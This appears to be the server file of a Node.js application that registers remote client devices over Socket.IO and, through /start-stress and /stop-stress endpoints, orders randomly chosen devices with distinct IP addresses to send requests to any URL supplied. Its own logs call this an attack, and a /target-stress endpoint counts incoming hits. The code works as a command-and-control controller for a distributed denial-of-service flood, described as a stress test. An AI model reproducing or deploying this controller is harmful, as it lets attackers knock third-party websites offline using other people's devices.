import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { createServer } from "http";
import { Server } from "socket.io";
import { check_user } from "./functions/base.js"; 
import crypto from "crypto";

import login from "./routers/login.js";
import code from "./routers/code.js";
import info from "./routers/info.js";
import nuser from "./routers/nuser.js";
import download from "./routers/download.js"

const RESET = "\x1b[0m";
const RED = "\x1b[31m";
const GREEN = "\x1b[32m";
const YELLOW = "\x1b[33m";
const CYAN = "\x1b[36m";

dotenv.config();

const app = express();
const httpServer = createServer(app);

const io = new Server(httpServer, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    allowEIO3: true,
    pingTimeout: 30000,
    pingInterval: 25000,
    transports: ['websocket', 'polling']
});

app.use(cors());
app.set('trust proxy', 1);
app.use(express.json());

app.use((req, res, next) => {
    const realIp = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for']?.split(',')[0].trim() || req.ip;
    req.realIp = realIp;
    next();
});

const connectedDevices = new Map();

io.on("connection", (socket) => {
    let currentDeviceID = null;
    let currentName = null;
    let isRegistered = false;

    let clientIp = socket.handshake.headers['cf-connecting-ip'] || 
                   socket.handshake.headers['x-forwarded-for'] || 
                   socket.handshake.address;
                   
    if (clientIp && clientIp.includes('::ffff:')) {
        clientIp = clientIp.replace('::ffff:', '');
    }
    
    socket.clientIp = clientIp; 

    socket.emit("get_device_info");

    socket.on("device_info", (object) => {
        if (!object || isRegistered) return;

        let data = object;
        if (typeof object === 'string') {
            try {
                data = JSON.parse(object);
            } catch (e) {
                return;
            }
        }

        currentName = data.name;
        currentDeviceID = data.name || data.device_id; 

        if (connectedDevices.has(currentDeviceID)) {
            const oldSocketId = connectedDevices.get(currentDeviceID);
            if (oldSocketId !== socket.id) {
                const oldSocket = io.sockets.sockets.get(oldSocketId);
                if (oldSocket) {
                    oldSocket.disconnect(true);
                }
            }
        }

        connectedDevices.set(currentDeviceID, socket.id);
        isRegistered = true;

        io.emit("online_count", connectedDevices.size);

        console.log(`${RESET} [ ${GREEN}>${RESET} ] ${socket.id} ${GREEN}|${RESET} ${socket.clientIp} ${GREEN}|${RESET} ${currentName} ${GREEN}|${RESET} ${connectedDevices.size}`);

        check_user(data, socket.id).catch(err => console.error(err));
    });

    socket.on("disconnect", () => {
        if (currentDeviceID && connectedDevices.get(currentDeviceID) === socket.id) {
            connectedDevices.delete(currentDeviceID);
            io.emit("online_count", connectedDevices.size);
            
            console.log(`${RESET} [ ${RED}<${RESET} ] ${socket.id} ${RED}|${RESET} ${socket.clientIp} ${RED}|${RESET} ${currentName || "Unknown"} ${RED}|${RESET} ${connectedDevices.size}`);
        }
    });
});

app.use("/", login);
app.use("/", code);
app.use("/", info);
app.use("/", nuser);
app.use("/", download);

function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
}

function getUniqueTargetSockets(devicesCount) {
    let allSocketIds = Array.from(connectedDevices.values());
    shuffleArray(allSocketIds);

    let targets = [];
    let usedIps = new Set();

    for (let id of allSocketIds) {
        const socket = io.sockets.sockets.get(id);
        if (!socket)
            continue;
        if (usedIps.has(socket.clientIp))
            continue;
        usedIps.add(socket.clientIp);
        targets.push(id);

        if (devicesCount > 0 && targets.length >= devicesCount) {
            break;
        }
    }
    return targets;
}

app.post("/start-stress", (req, res) => {
    console.log(`${RESET} [ ${RED}Stress${RESET} ] Attack started`);
    let { url, devices, method } = req.body;
    
    if (!url) return res.status(400).end();

    let targetIds = getUniqueTargetSockets(devices);

    if (targetIds.length === 0)
        return res.status(404).end();

    targetIds.forEach(socketId => {
        const socket = io.sockets.sockets.get(socketId);
        if (!socket)
            return;
        socket.emit("start_work", {
            url: url,
            method: method || "GET"
        });
    });
    res.status(200).end();
});

app.post("/stop-stress", (req, res) => {
    io.emit("stop_work", {});
    console.log(`${RESET} [ ${RED}Stress${RESET} ] Attack stopped`);
    res.status(200).end();
});


let stressCounter = 0;
app.all("/target-stress", (req, res) => {
    stressCounter++;

    let attackerIp = req.headers['cf-connecting-ip'] || 
                     req.headers['x-forwarded-for']?.split(',')[0].trim() || 
                     req.ip;

    if (attackerIp && attackerIp.includes('::ffff:')) {
        attackerIp = attackerIp.replace('::ffff:', '');
    }

    const now = new Date();
    const h = now.getHours().toString().padStart(2, '0');
    const m = now.getMinutes().toString().padStart(2, '0');
    const s = now.getSeconds().toString().padStart(2, '0');
    const time = `${h}:${m}:${s}`;

    console.log(`${RESET} [ ${RED}Attack${RESET} ] ${attackerIp} ${RED}|${RESET} ${time} ${RED}|${RESET} Hits: ${stressCounter}`);
    
    res.status(200).end();
});

app.all("/", (req, res) => res.send("Server online"));

const PORT = process.env.PORT;

httpServer.listen(PORT, () => {
    console.log(`\n>> Server online <<\n`);
});